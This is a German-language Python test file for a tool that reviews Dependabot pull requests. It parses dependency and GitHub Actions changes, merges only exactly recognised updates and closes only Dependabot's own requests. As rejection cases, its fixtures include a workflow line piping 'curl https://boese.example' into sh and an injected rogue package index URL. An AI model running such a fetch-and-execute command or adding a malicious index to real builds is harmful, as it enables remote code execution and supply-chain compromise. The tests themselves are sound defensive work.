# -*- coding: utf-8 -*-
"""Wartung des Werkzeugs: Sicherheitsprüfung und Dependabot-Vorschläge (nur auf Knopfdruck)."""
import os
import sys
import unittest
from unittest import mock

HIER = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HIER))
import signier_werkzeug as W  # noqa: E402

H = "a" * 64
REQ = {"filename": "requirements-bau.txt", "status": "modified",
       "patch": "@@ -1,2 +1,2 @@\n altgraph==0.17.5 --hash=sha256:" + H + "\n-setuptools==84.0.0 --hash=sha256:" + H
                + "\n+setuptools==84.2.1 --hash=sha256:" + "b" * 64 + " --hash=sha256:" + "c" * 64}
WF = {"filename": ".github/workflows/bauen.yml", "status": "modified",
      "patch": "@@ -1 +1 @@\n-      - uses: actions/checkout@" + "1" * 40 + " # v5.1.0\n+      - uses: actions/checkout@" + "2" * 40
               + " # v7.0.1"}


class AenderungenTests(unittest.TestCase):
    def test_pakete_und_actions(self):
        self.assertEqual(W.wartung_aenderungen([REQ]), (["setuptools 84.0.0 → 84.2.1"], ""))
        self.assertEqual(W.wartung_aenderungen([WF]), (["actions/checkout v5.1.0 (1111111) → v7.0.1 (2222222)"], ""))

    def test_nur_genau_angezeigtes(self):
        for dateien, grund in (([{**REQ, "filename": "signier_werkzeug.py"}], "ändert signier_werkzeug.py"),
                               ([{**REQ, "status": "added"}], "ändert"),
                               ([{**REQ, "patch": REQ["patch"] + "\n+--index-url https://boese.example/"}], "andere Änderung"),
                               ([{**REQ, "patch": REQ["patch"] + "\n+boese==1.0"}], "andere Änderung"),   # ohne Prüfsumme
                               ([{**WF, "patch": WF["patch"].replace("2" * 40, "v7")}], "andere Änderung"),   # kein SHA
                               ([{**WF, "patch": WF["patch"] + "\n+        run: curl https://boese.example | sh"}], "andere Änderung"),
                               ([{**REQ, "patch": None}], "nicht lesbar"),
                               ([], "keine erkennbare")):
            with self.subTest(grund=grund):
                self.assertIn(grund, W.wartung_aenderungen(dateien)[1])


class Attrappe:
    """GitHub nachgestellt: PR 3 (Dependabot), Tests je nach Einstellung."""
    def __init__(self, tests="success", login="dependabot[bot]", dateien=(REQ,)):
        self.tests, self.login, self.dateien, self.aufrufe = tests, login, list(dateien), []

    def __call__(self, pfad, token, methode="GET", daten=None, **k):
        self.aufrufe.append((methode, pfad, daten))
        if methode != "GET":
            return {}
        if pfad.endswith("/pulls/3"):
            return {"number": 3, "title": "Bau-Pakete", "state": "open", "mergeable": True, "user": {"login": self.login},
                    "head": {"sha": "f" * 40}, "html_url": f"https://github.com/{W.WERKZEUG_REPO}/pull/3"}
        if "/pulls/3/files" in pfad:
            return self.dateien
        if "/check-runs" in pfad:
            return {"check_runs": [{"name": "tests", "status": "completed", "conclusion": self.tests}]}
        if "/pulls?state=open" in pfad:
            return [{"number": 3, "user": {"login": self.login}}]
        if "/dependabot/alerts" in pfad:
            raise W.GitHubFehler("x", 403)
        if f"/{W.SICHERHEIT_WORKFLOW}/runs" in pfad:
            return {"workflow_runs": [{"id": 9, "status": "completed", "conclusion": "failure", "created_at": "2026-11-02T13:27:17Z",
                                       "html_url": f"https://github.com/{W.WERKZEUG_REPO}/actions/runs/9"}]}
        raise AssertionError(pfad)


class AblaufTests(unittest.TestCase):
    def test_stand(self):
        with mock.patch.object(W, "_gh", Attrappe()):
            d = W.wartung_stand("t")
        self.assertEqual(d["pruefung"]["zustand"], "fehlgeschlagen")
        self.assertIn("Dependabot alerts: Read", d["warnungen_fehler"])
        v = d["vorschlaege"][0]
        self.assertEqual((v["nummer"], v["uebernehmbar"], v["aenderungen"]), (3, True, ["setuptools 84.0.0 → 84.2.1"]))

    def test_fremde_prs_nicht_angezeigt(self):
        with mock.patch.object(W, "_gh", Attrappe(login="jemand")):
            self.assertEqual(W.wartung_stand("t")["vorschlaege"], [])

    def test_uebernehmen_genau_der_angezeigte_stand(self):
        g = Attrappe()
        with mock.patch.object(W, "_gh", g):
            r = W.wartung_uebernehmen("t", 3, "f" * 40)
        schreibend = [(m, p, d) for m, p, d in g.aufrufe if m != "GET"]
        self.assertEqual(schreibend[0][:2], ("PUT", f"/repos/{W.WERKZEUG_REPO}/pulls/3/merge"))
        self.assertEqual(schreibend[0][2]["sha"], "f" * 40)
        self.assertEqual(schreibend[1][:2], ("POST", f"/repos/{W.WERKZEUG_REPO}/actions/workflows/sicherheit.yml/dispatches"))
        self.assertIn("setuptools 84.0.0 → 84.2.1", r["meldung"])

    def test_nicht_uebernehmen(self):
        for g, sha, text in ((Attrappe(), "e" * 40, "seit der Anzeige geändert"),
                             (Attrappe(tests="failure"), "f" * 40, "Tests rot"),
                             (Attrappe(dateien=[{**REQ, "filename": "signier_werkzeug.py"}]), "f" * 40, "ändert")):
            with self.subTest(text=text), mock.patch.object(W, "_gh", g):
                self.assertRaisesRegex(ValueError, text, W.wartung_uebernehmen, "t", 3, sha)
                self.assertFalse([a for a in g.aufrufe if a[0] != "GET"])   # nichts geschrieben

    def test_rechte_fehlen(self):
        def gh(pfad, token, methode="GET", daten=None, **k):
            if methode == "PUT":
                raise W.GitHubFehler("x", 403)
            return Attrappe()(pfad, token, methode, daten, **k)
        with mock.patch.object(W, "_gh", side_effect=gh):
            self.assertRaisesRegex(ValueError, "Pull requests: Read and write", W.wartung_uebernehmen, "t", 3, "f" * 40)

    def test_schliessen_nur_dependabot(self):
        with mock.patch.object(W, "_gh", Attrappe(login="jemand")):
            self.assertRaisesRegex(ValueError, "nur offene Vorschläge von Dependabot", W.wartung_schliessen, "t", 3)
        g = Attrappe()
        with mock.patch.object(W, "_gh", g):
            W.wartung_schliessen("t", 3)
        self.assertEqual([a for a in g.aufrufe if a[0] != "GET"], [("PATCH", f"/repos/{W.WERKZEUG_REPO}/pulls/3",
                                                                   {"state": "closed"})])

    def test_seite(self):
        for teil in ('id="m-stand"', 'id="m-pruefen"', 'api("wartung_uebernehmen", {nummer: v.nummer, sha: v.sha})',
                     "Workflows: Read and write", "Dependabot alerts: Read"):
            self.assertIn(teil, W.SEITE)


if __name__ == "__main__":
    unittest.main()
